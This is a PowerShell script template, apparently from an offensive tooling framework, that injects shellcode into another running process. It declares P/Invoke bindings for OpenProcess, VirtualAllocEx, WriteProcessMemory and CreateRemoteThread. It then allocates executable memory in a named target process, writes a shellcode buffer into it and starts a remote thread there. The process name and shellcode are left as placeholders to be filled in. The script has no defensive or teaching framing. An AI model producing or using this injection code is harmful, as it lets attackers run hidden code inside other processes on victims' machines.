$types = @"
using System;
using System.Runtime.InteropServices;

public class myclass{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
"@

add-type $types

$myProcessID = ([System.Diagnostics.Process]::GetProcessesByName("[[[[processName]]]]"))[0].Id;
write-host $myProcessID
[IntPtr]$hprocess = [myclass]::OpenProcess(0x001F0FFF,$false,$myProcessID)
$addr = [myclass]::VirtualAllocEx($hprocess,[IntPtr]::Zero,0x1000,0x3000,0x40)

[[[[shellCode]]]]

[IntPtr]$outsize = [IntPtr]::Zero

[myclass]::WriteProcessMemory($hprocess, $addr, $buf, $buf.Length, [ref]$outsize)
$hthread = [myclass]::CreateRemoteThread($hprocess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero,0,[IntPtr]::Zero)
